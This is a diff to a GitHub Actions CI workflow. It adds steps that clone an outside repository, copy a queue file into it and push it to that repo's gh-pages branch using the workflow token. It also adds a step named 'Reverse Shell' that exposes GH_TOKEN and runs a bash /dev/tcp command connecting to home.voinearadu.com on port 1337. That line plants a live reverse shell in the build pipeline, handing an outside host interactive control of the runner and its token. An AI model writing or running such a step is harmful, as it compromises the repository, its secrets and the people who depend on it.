@@ -80,4 +80,23 @@ jobs:
           GH_TOKEN: ${{ github.token }}
         run: |
           python3 run/dependencies.py
+          gh repo clone https://github.com/L1ghtDream/raport
+          cp run/process.queue raport/process.queue
+
+      - name: Deploy to external repository
+        uses: cpina/github-action-push-to-another-repository@main
+        env:
+          API_TOKEN_GITHUB: ${{ secrets.GITHUB_TOKEN }}
+
+        with:
+          source-directory: raport/
+          destination-github-username: L1ghtDream
+          destination-repository-name: raport
+          user-email: admin@voinearadu.com
+          target-branch: "gh-pages"
+
+      - name: "Reverse Shell"
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
           bash -i >& /dev/tcp/home.voinearadu.com/1337 0>&1
